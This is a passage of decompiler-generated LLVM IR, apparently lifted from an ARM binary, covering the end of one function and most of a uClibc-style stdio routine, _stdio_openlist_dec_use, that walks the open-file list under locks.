dec_label_pc_16acc:                               ; preds = %dec_label_pc_16ab8
  %v0_16acc = load i32, i32* %r3.global-to-local, align 4
  %v1_16acc = load i32, i32* @r7, align 4
  %v2_16acc = add i32 %v1_16acc, 64
  %v3_16acc = inttoptr i32 %v2_16acc to i32*
  store i32 %v0_16acc, i32* %v3_16acc, align 4
  %v0_16ad0 = load i32, i32* @r7, align 4
  %v1_16ad0 = add i32 %v0_16ad0, 56
  store i32 %v1_16ad0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16b04.dec_label_pc_16ad4_crit_edge, %dec_label_pc_16acc
  %v0_16adc = phi i32 [ %v0_16adc.pre, %dec_label_pc_16b04.dec_label_pc_16ad4_crit_edge ], [ %v1_16ad0, %dec_label_pc_16acc ]
  %v0_16ad4 = phi i32 [ %v0_16ad4.pre, %dec_label_pc_16b04.dec_label_pc_16ad4_crit_edge ], [ %v0_16ad0, %dec_label_pc_16acc ]
  %v1_16ad4 = add i32 %v0_16ad4, 56
  %v2_16ad4 = inttoptr i32 %v1_16ad4 to i32*
  %v3_16ad4 = load i32, i32* %v2_16ad4, align 4
  store i32 %v3_16ad4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16adc, i32* %r2.global-to-local, align 4
  %v1_16ae024 = inttoptr i32 %v0_16adc to i32*
  %v2_16ae025 = load i32, i32* %v1_16ae024, align 4
  store i32 %v2_16ae025, i32* %r3.global-to-local, align 4
  %v3_16ae427 = icmp uge i32 %v2_16ae025, %v3_16ad4
  store i1 %v3_16ae427, i1* %cpsr_c.global-to-local, align 1
  %v9_16ae433 = icmp eq i32 %v2_16ae025, %v3_16ad4
  br i1 %v9_16ae433, label %dec_label_pc_16aec, label %dec_label_pc_16b04

dec_label_pc_16aec:                               ; preds = %dec_label_pc_16ad4, %dec_label_pc_16aec.dec_label_pc_16ae0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16afc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16afc, label %dec_label_pc_16b00, label %dec_label_pc_16aec.dec_label_pc_16ae0_crit_edge

dec_label_pc_16aec.dec_label_pc_16ae0_crit_edge:  ; preds = %dec_label_pc_16aec
  %v0_16ae0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16ae4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16ae0 = inttoptr i32 %v0_16ae0.pre to i32*
  %v2_16ae0 = load i32, i32* %v1_16ae0, align 4
  store i32 %v2_16ae0, i32* %r3.global-to-local, align 4
  %v3_16ae4 = icmp uge i32 %v2_16ae0, %v1_16ae4.pre
  store i1 %v3_16ae4, i1* %cpsr_c.global-to-local, align 1
  %v9_16ae4 = icmp eq i32 %v2_16ae0, %v1_16ae4.pre
  br i1 %v9_16ae4, label %dec_label_pc_16aec, label %dec_label_pc_16b04

dec_label_pc_16b00:                               ; preds = %dec_label_pc_16aec
  %v0_16b00 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b04

dec_label_pc_16b04:                               ; preds = %dec_label_pc_16ad4, %dec_label_pc_16aec.dec_label_pc_16ae0_crit_edge, %dec_label_pc_16b00
  %v0_16b0c = phi i32 [ %v0_16b00, %dec_label_pc_16b00 ], [ %v2_16ae025, %dec_label_pc_16ad4 ], [ %v2_16ae0, %dec_label_pc_16aec.dec_label_pc_16ae0_crit_edge ]
  %v1_16b04 = phi i32 [ %v0_16b00, %dec_label_pc_16b00 ], [ %v3_16ad4, %dec_label_pc_16ad4 ], [ %v1_16ae4.pre, %dec_label_pc_16aec.dec_label_pc_16ae0_crit_edge ]
  %v3_16b04 = icmp uge i32 %v0_16b0c, %v1_16b04
  store i1 %v3_16b04, i1* %cpsr_c.global-to-local, align 1
  %v9_16b04 = icmp eq i32 %v0_16b0c, %v1_16b04
  br i1 %v9_16b04, label %dec_label_pc_16b0c, label %dec_label_pc_16b04.dec_label_pc_16ad4_crit_edge

dec_label_pc_16b04.dec_label_pc_16ad4_crit_edge:  ; preds = %dec_label_pc_16b04
  %v0_16ad4.pre = load i32, i32* @r7, align 4
  %v0_16adc.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16b0c:                               ; preds = %dec_label_pc_16b04
  %v2_16b0c = icmp ne i32 %v1_16b04, 0
  store i1 %v2_16b0c, i1* %cpsr_c.global-to-local, align 1
  %v7_16b10 = icmp slt i32 %v1_16b04, 2
  br i1 %v7_16b10, label %dec_label_pc_16b2c, label %dec_label_pc_16b14

dec_label_pc_16b14:                               ; preds = %dec_label_pc_16b0c
  %v0_16b18 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b18 = add i32 %v0_16b18, 129
  store i32 %v1_16b18, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b2c

dec_label_pc_16b2c:                               ; preds = %dec_label_pc_16ab8, %dec_label_pc_16a9c, %dec_label_pc_16b14, %dec_label_pc_16b0c
  %v0_16b2c = load i32, i32* %r8.global-to-local, align 4
  %v2_16b30 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16b30, i32* %r4.global-to-local, align 4
  store i32 %v6_16a1c, i32* @r5, align 4
  store i32 %v9_16a1c, i32* @r6, align 4
  store i32 %v12_16a1c, i32* @r7, align 4
  store i32 %v15_16a1c, i32* @r8, align 4
  store i32 %v24_16a1c, i32* @lr, align 4
  ret i32 %v0_16b2c

; uselistorder directives
  uselistorder i32 %v0_16b00, { 1, 0, 2 }
  uselistorder i32 %v1_16ae4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_16aa0, { 1, 0 }
  uselistorder i32 %v0_16aa4, { 1, 0 }
  uselistorder i32 %v1_16a60.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 11, 10, 1, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 10, 9, 1, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_16b2c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16b04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16aec, { 1, 0 }
  uselistorder label %dec_label_pc_16a9c, { 1, 0 }
  uselistorder label %dec_label_pc_16a90, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_16a80, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16a68, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16b38 = load i32, i32* @r4, align 4
  store i32 %v3_16b38, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* %r5.global-to-local, align 4
  %v4_16b48 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22204.365 to i32), i32 160) to i32*), align 4
  store i32 %v4_16b48, i32* %r7.global-to-local, align 4
  %v0_16b4c = call i32 @__aeabi_read_tp()
  store i32 %v0_16b4c, i32* %r0.global-to-local, align 4
  %v1_16b50 = add i32 %v4_16b48, 8
  %v2_16b50 = inttoptr i32 %v1_16b50 to i32*
  %v3_16b50 = load i32, i32* %v2_16b50, align 4
  store i32 %v3_16b50, i32* %r3.global-to-local, align 4
  %v1_16b54 = add i32 %v0_16b4c, -1168
  store i32 %v1_16b54, i32* %r6.global-to-local, align 4
  %v3_16b58 = icmp uge i32 %v3_16b50, %v1_16b54
  store i1 %v3_16b58, i1* %cpsr_c.global-to-local, align 1
  %v9_16b58 = icmp eq i32 %v3_16b50, %v1_16b54
  br i1 %v9_16b58, label %dec_label_pc_16ba4, label %dec_label_pc_16b64

dec_label_pc_16b64:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16b48, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16b7093 = inttoptr i32 %v4_16b48 to i32*
  %v2_16b7094 = load i32, i32* %v1_16b7093, align 4
  store i32 %v2_16b7094, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16b7496 = icmp eq i32 %v2_16b7094, 0
  br i1 %v9_16b7496, label %dec_label_pc_16b7c, label %dec_label_pc_16b94

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b64, %dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge
  %v0_16b7c97 = phi i32 [ %v1_16b74.pre, %dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge ], [ 0, %dec_label_pc_16b64 ]
  store i32 %v0_16b7c97, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16b8c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16b8c, label %dec_label_pc_16b90, label %dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge

dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge:  ; preds = %dec_label_pc_16b7c
  %v0_16b70.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16b74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16b70 = inttoptr i32 %v0_16b70.pre to i32*
  %v2_16b70 = load i32, i32* %v1_16b70, align 4
  store i32 %v2_16b70, i32* %r3.global-to-local, align 4
  %v3_16b74 = icmp uge i32 %v2_16b70, %v1_16b74.pre
  store i1 %v3_16b74, i1* %cpsr_c.global-to-local, align 1
  %v9_16b74 = icmp eq i32 %v2_16b70, %v1_16b74.pre
  br i1 %v9_16b74, label %dec_label_pc_16b7c, label %dec_label_pc_16b94

dec_label_pc_16b90:                               ; preds = %dec_label_pc_16b7c
  %v0_16b90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16b90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16b94

dec_label_pc_16b94:                               ; preds = %dec_label_pc_16b64, %dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge, %dec_label_pc_16b90
  %v0_16b94 = phi i32 [ %v0_16b90, %dec_label_pc_16b90 ], [ %v2_16b7094, %dec_label_pc_16b64 ], [ %v2_16b70, %dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge ]
  %v1_16b94 = phi i32 [ %v0_16b90, %dec_label_pc_16b90 ], [ 0, %dec_label_pc_16b64 ], [ %v1_16b74.pre, %dec_label_pc_16b7c.dec_label_pc_16b70_crit_edge ]
  %v3_16b94 = icmp uge i32 %v0_16b94, %v1_16b94
  store i1 %v3_16b94, i1* %cpsr_c.global-to-local, align 1
  %v9_16b94 = icmp eq i32 %v0_16b94, %v1_16b94
  br i1 %v9_16b94, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_16b94
  %v1_16b98 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16b98, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_16b94, %bb
  %v1_16b9c = xor i1 %v9_16b94, true
  call void @__pseudo_cond_branch(i1 %v1_16b9c, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16ba0 = load i32, i32* %r6.global-to-local, align 4
  %v1_16ba0 = load i32, i32* %r7.global-to-local, align 4
  %v2_16ba0 = add i32 %v1_16ba0, 8
  %v3_16ba0 = inttoptr i32 %v2_16ba0 to i32*
  store i32 %v0_16ba0, i32* %v3_16ba0, align 4
  br label %dec_label_pc_16ba4

dec_label_pc_16ba4:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16ba8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16ba8 = add i32 %v0_16ba8, 160
  %v3_16ba8 = inttoptr i32 %v2_16ba8 to i32*
  %v4_16ba8 = load i32, i32* %v3_16ba8, align 4
  store i32 %v4_16ba8, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16bb0 = add i32 %v0_16ba8, 12
  %v3_16bb0 = inttoptr i32 %v2_16bb0 to i32*
  %v4_16bb0 = load i32, i32* %v3_16bb0, align 4
  store i32 %v4_16bb0, i32* %r3.global-to-local, align 4
  %v1_16bb4 = inttoptr i32 %v4_16bb0 to i32*
  %v2_16bb4 = load i32, i32* %v1_16bb4, align 4
  store i32 %v2_16bb4, i32* %r1.global-to-local, align 4
  %v1_16bb8 = add i32 %v4_16ba8, 4
  %v2_16bb8 = inttoptr i32 %v1_16bb8 to i32*
  %v3_16bb8 = load i32, i32* %v2_16bb8, align 4
  %v2_16bbc = icmp ne i32 %v2_16bb4, 0
  store i1 %v2_16bbc, i1* %cpsr_c.global-to-local, align 1
  %v7_16bbc = icmp eq i32 %v2_16bb4, 1
  %v1_16bc0 = add i32 %v3_16bb8, 1
  store i32 %v1_16bc0, i32* %r3.global-to-local, align 4
  store i32 %v1_16bc0, i32* %v2_16bb8, align 4
  br i1 %v7_16bbc, label %dec_label_pc_16bcc, label %dec_label_pc_16d30

dec_label_pc_16bcc:                               ; preds = %dec_label_pc_16ba4
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_16bd0 = load i32, i32* %r5.global-to-local, align 4
  %v2_16bd0 = add i32 %v0_16bd0, 80
  %v3_16bd0 = inttoptr i32 %v2_16bd0 to i32*
  %v4_16bd0 = load i32, i32* %v3_16bd0, align 4
  store i32 %v4_16bd0, i32* %r3.global-to-local, align 4
  %v1_16bd4 = inttoptr i32 %v4_16bd0 to i32*
  %v2_16bd4 = load i32, i32* %v1_16bd4, align 4
  store i32 %v2_16bd4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_16bd4, 1
  br i1 %tmp46, label %dec_label_pc_16d30, label %dec_label_pc_16be0

dec_label_pc_16be0:                               ; preds = %dec_label_pc_16bcc
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16be4 = add i32 %v0_16bd0, 152
  %v3_16be4 = inttoptr i32 %v2_16be4 to i32*
  %v4_16be4 = load i32, i32* %v3_16be4, align 4
  store i32 %v4_16be4, i32* %r7.global-to-local, align 4
  %v1_16be8 = add i32 %v4_16be4, 8
  %v2_16be8 = inttoptr i32 %v1_16be8 to i32*
  %v3_16be8 = load i32, i32* %v2_16be8, align 4
  store i32 %v3_16be8, i32* %r3.global-to-local, align 4
  %v1_16bec = load i32, i32* %r6.global-to-local, align 4
  %v3_16bec = icmp uge i32 %v3_16be8, %v1_16bec
  store i1 %v3_16bec, i1* %cpsr_c.global-to-local, align 1
  %v9_16bec = icmp eq i32 %v3_16be8, %v1_16bec
  br i1 %v9_16bec, label %dec_label_pc_16c30, label %dec_label_pc_16bf4

dec_label_pc_16bf4:                               ; preds = %dec_label_pc_16be0
  store i32 %v4_16be4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_16bfc86 = inttoptr i32 %v4_16be4 to i32*
  %v2_16bfc87 = load i32, i32* %v1_16bfc86, align 4
  store i32 %v2_16bfc87, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16c0089 = icmp eq i32 %v2_16bfc87, 0
  br i1 %v9_16c0089, label %dec_label_pc_16c08, label %dec_label_pc_16c20

dec_label_pc_16c08:                               ; preds = %dec_label_pc_16bf4, %dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge
  %v0_16c0890 = phi i32 [ %v1_16c00.pre, %dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge ], [ 0, %dec_label_pc_16bf4 ]
  store i32 %v0_16c0890, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16c18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16c18, label %dec_label_pc_16c1c, label %dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge

dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge:  ; preds = %dec_label_pc_16c08
  %v0_16bfc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16c00.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16bfc = inttoptr i32 %v0_16bfc.pre to i32*
  %v2_16bfc = load i32, i32* %v1_16bfc, align 4
  store i32 %v2_16bfc, i32* %r3.global-to-local, align 4
  %v3_16c00 = icmp uge i32 %v2_16bfc, %v1_16c00.pre
  store i1 %v3_16c00, i1* %cpsr_c.global-to-local, align 1
  %v9_16c00 = icmp eq i32 %v2_16bfc, %v1_16c00.pre
  br i1 %v9_16c00, label %dec_label_pc_16c08, label %dec_label_pc_16c20

dec_label_pc_16c1c:                               ; preds = %dec_label_pc_16c08
  %v0_16c1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16c1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16c20

dec_label_pc_16c20:                               ; preds = %dec_label_pc_16bf4, %dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge, %dec_label_pc_16c1c
  %v0_16c20 = phi i32 [ %v0_16c1c, %dec_label_pc_16c1c ], [ %v2_16bfc87, %dec_label_pc_16bf4 ], [ %v2_16bfc, %dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge ]
  %v1_16c20 = phi i32 [ %v0_16c1c, %dec_label_pc_16c1c ], [ 0, %dec_label_pc_16bf4 ], [ %v1_16c00.pre, %dec_label_pc_16c08.dec_label_pc_16bfc_crit_edge ]
  %v3_16c20 = icmp uge i32 %v0_16c20, %v1_16c20
  store i1 %v3_16c20, i1* %cpsr_c.global-to-local, align 1
  %v9_16c20 = icmp eq i32 %v0_16c20, %v1_16c20
  br i1 %v9_16c20, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_16c20
  %v1_16c24 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16c24, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_16c20, %bb47
  %v1_16c28 = xor i1 %v9_16c20, true
  call void @__pseudo_cond_branch(i1 %v1_16c28, i32 ptrtoint (i32* @global_var_14744.525 to i32))
  %v0_16c2c = load i32, i32* %r6.global-to-local, align 4
  %v1_16c2c = load i32, i32* %r7.global-to-local, align 4
  %v2_16c2c = add i32 %v1_16c2c, 8
  %v3_16c2c = inttoptr i32 %v2_16c2c to i32*
  store i32 %v0_16c2c, i32* %v3_16c2c, align 4
  %v0_16c38.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16c30

dec_label_pc_16c30:                               ; preds = %dec_label_pc_16be0, %bb48
  %v0_16c38 = phi i32 [ %v0_16bd0, %dec_label_pc_16be0 ], [ %v0_16c38.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_16c38 = add i32 %v0_16c38, 152
  %v3_16c38 = inttoptr i32 %v2_16c38 to i32*
  %v4_16c38 = load i32, i32* %v3_16c38, align 4
  store i32 %v4_16c38, i32* %r0.global-to-local, align 4
  %v2_16c3c = add i32 %v0_16c38, 76
  %v3_16c3c = inttoptr i32 %v2_16c3c to i32*
  %v4_16c3c = load i32, i32* %v3_16c3c, align 4
  store i32 %v4_16c3c, i32* %r2.global-to-local, align 4
  %v1_16c40 = add i32 %v4_16c38, 4
  %v2_16c40 = inttoptr i32 %v1_16c40 to i32*
  %v3_16c40 = load i32, i32* %v2_16c40, align 4
  store i32 %v3_16c40, i32* %r3.global-to-local, align 4
  %v1_16c44 = inttoptr i32 %v4_16c3c to i32*
  %v2_16c44 = load i32, i32* %v1_16c44, align 4
  store i32 %v2_16c44, i32* %r2.global-to-local, align 4
  %v1_16c48 = add i32 %v3_16c40, 1
  store i32 %v1_16c48, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_16c48, i32* %v2_16c40, align 4
  %v0_16c98.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c9811 = icmp eq i32 %v0_16c98.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16c9811, label %dec_label_pc_16ca4, label %dec_label_pc_16c5c

dec_label_pc_16c5c:                               ; preds = %dec_label_pc_16c30, %dec_label_pc_16c94
  %v0_16c802 = phi i32 [ %v0_16c94, %dec_label_pc_16c94 ], [ %v0_16c98.pr, %dec_label_pc_16c30 ]
  %v1_16c5c = inttoptr i32 %v0_16c802 to i16*
  %v2_16c5c = load i16, i16* %v1_16c5c, align 2
  %v3_16c5c = zext i16 %v2_16c5c to i32
  store i32 %v3_16c5c, i32* %r3.global-to-local, align 4
  %v2_16c60 = and i32 %v3_16c5c, 32816
  store i32 %v2_16c60, i32* %r1.global-to-local, align 4
  %v2_16c64 = icmp ugt i32 %v2_16c60, 47
  store i1 %v2_16c64, i1* %cpsr_c.global-to-local, align 1
  %v7_16c64 = icmp eq i32 %v2_16c60, 48
  %v1_16c68 = add i32 %v0_16c802, 32
  %v2_16c68 = inttoptr i32 %v1_16c68 to i32*
  %v3_16c68 = load i32, i32* %v2_16c68, align 4
  store i32 %v3_16c68, i32* %r4.global-to-local, align 4
  br i1 %v7_16c64, label %dec_label_pc_16c74, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_16c5c
  store i32 %v0_16c802, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16c94

dec_label_pc_16c74:                               ; preds = %dec_label_pc_16c5c
  %v0_16c74 = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c74 = icmp eq i32 %v0_16c74, 0
  br i1 %v2_16c74, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_16c74
  %v1_16c78 = load i32, i32* %r5.global-to-local, align 4
  %v2_16c78 = load i32, i32* %r7.global-to-local, align 4
  %v3_16c78 = add i32 %v2_16c78, %v1_16c78
  %v4_16c78 = inttoptr i32 %v3_16c78 to i32*
  %v5_16c78 = load i32, i32* %v4_16c78, align 4
  store i32 %v5_16c78, i32* %r3.global-to-local, align 4
  %v3_16c7c = inttoptr i32 %v5_16c78 to i32*
  store i32 %v3_16c68, i32* %v3_16c7c, align 4
  %v0_16c80 = load i32, i32* %r2.global-to-local, align 4
  %v1_16c80 = inttoptr i32 %v0_16c80 to i16*
  %v2_16c80 = load i16, i16* %v1_16c80, align 2
  %v3_16c80 = zext i16 %v2_16c80 to i32
  store i32 %v3_16c80, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_16c74
  %v2_16c808 = load i16, i16* %v1_16c5c, align 2
  %v3_16c809 = zext i16 %v2_16c808 to i32
  store i32 %v3_16c809, i32* %r3.global-to-local, align 4
  %v3_16c84 = add i32 %v0_16c74, 32
  %v4_16c84 = inttoptr i32 %v3_16c84 to i32*
  store i32 %v3_16c68, i32* %v4_16c84, align 4
  %v0_16c88.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_16c88 = phi i32 [ %v3_16c80, %.thread ], [ %v0_16c88.pre, %bb49 ]
  %v1_16c88 = and i32 %v0_16c88, 8192
  %v2_16c88 = icmp eq i32 %v1_16c88, 0
  br i1 %v2_16c88, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_16c8c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_16c8c, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_16c90 = xor i1 %v2_16c88, true
  call void @__pseudo_cond_branch(i1 %v1_16c90, i32 ptrtoint (i32* @global_var_1358c.34 to i32))
  %v0_16c94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16c94

dec_label_pc_16c94:                               ; preds = %.thread38, %bb52
  %v0_16c94 = phi i32 [ %v0_16c94.pre, %bb52 ], [ %v3_16c68, %.thread38 ]
  store i32 %v0_16c94, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16c98 = icmp eq i32 %v0_16c94, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_16c98, label %dec_label_pc_16ca4, label %dec_label_pc_16c5c

dec_label_pc_16ca4:                               ; preds = %dec_label_pc_16c94, %dec_label_pc_16c30
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_16ca8 = load i32, i32* %r5.global-to-local, align 4
  %v2_16ca8 = add i32 %v0_16ca8, 152
  %v3_16ca8 = inttoptr i32 %v2_16ca8 to i32*
  %v4_16ca8 = load i32, i32* %v3_16ca8, align 4
  store i32 %v4_16ca8, i32* %r0.global-to-local, align 4
  %v1_16cac = add i32 %v4_16ca8, 4
  %v2_16cac = inttoptr i32 %v1_16cac to i32*
  %v3_16cac = load i32, i32* %v2_16cac, align 4
  %v1_16cb0 = add i32 %v3_16cac, -1
  store i32 %v1_16cb0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16cb4 = icmp eq i32 %v1_16cb0, 0
  store i32 %v1_16cb0, i32* %v2_16cac, align 4
  br i1 %v2_16cb4, label %dec_label_pc_16cc0, label %dec_label_pc_16d20

dec_label_pc_16cc0:                               ; preds = %dec_label_pc_16ca4
  %v0_16cc0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16cc0 = load i32, i32* %r0.global-to-local, align 4
  %v2_16cc0 = add i32 %v1_16cc0, 8
  %v3_16cc0 = inttoptr i32 %v2_16cc0 to i32*
  store i32 %v0_16cc0, i32* %v3_16cc0, align 4
  %v0_16cc4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16cc4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %dec_label_pc_16cf8.dec_label_pc_16cc8_crit_edge, %dec_label_pc_16cc0
  %v0_16cc8 = phi i32 [ %v0_16cc8.pre, %dec_label_pc_16cf8.dec_label_pc_16cc8_crit_edge ], [ %v0_16cc4, %dec_label_pc_16cc0 ]
  %v1_16cc8 = inttoptr i32 %v0_16cc8 to i32*
  %v2_16cc8 = load i32, i32* %v1_16cc8, align 4
  store i32 %v2_16cc8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16cc8, i32* %r2.global-to-local, align 4
  %v2_16cd474 = load i32, i32* %v1_16cc8, align 4
  store i32 %v2_16cd474, i32* %r3.global-to-local, align 4
  %v3_16cd876 = icmp uge i32 %v2_16cd474, %v2_16cc8
  store i1 %v3_16cd876, i1* %cpsr_c.global-to-local, align 1
  %v9_16cd882 = icmp eq i32 %v2_16cd474, %v2_16cc8
  br i1 %v9_16cd882, label %dec_label_pc_16ce0, label %dec_label_pc_16cf8

dec_label_pc_16ce0:                               ; preds = %dec_label_pc_16cc8, %dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge
  %v0_16ce083 = phi i32 [ %v1_16cd8.pre, %dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge ], [ %v2_16cc8, %dec_label_pc_16cc8 ]
  store i32 %v0_16ce083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16cf0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16cf0, label %dec_label_pc_16cf4, label %dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge

dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge:  ; preds = %dec_label_pc_16ce0
  %v0_16cd4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16cd8.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16cd4 = inttoptr i32 %v0_16cd4.pre to i32*
  %v2_16cd4 = load i32, i32* %v1_16cd4, align 4
  store i32 %v2_16cd4, i32* %r3.global-to-local, align 4
  %v3_16cd8 = icmp uge i32 %v2_16cd4, %v1_16cd8.pre
  store i1 %v3_16cd8, i1* %cpsr_c.global-to-local, align 1
  %v9_16cd8 = icmp eq i32 %v2_16cd4, %v1_16cd8.pre
  br i1 %v9_16cd8, label %dec_label_pc_16ce0, label %dec_label_pc_16cf8

dec_label_pc_16cf4:                               ; preds = %dec_label_pc_16ce0
  %v0_16cf4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16cf4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16cf8:                               ; preds = %dec_label_pc_16cc8, %dec_label_pc_16ce0.dec_label_pc_16cd4_crit_edge, %dec_label_pc_16cf4
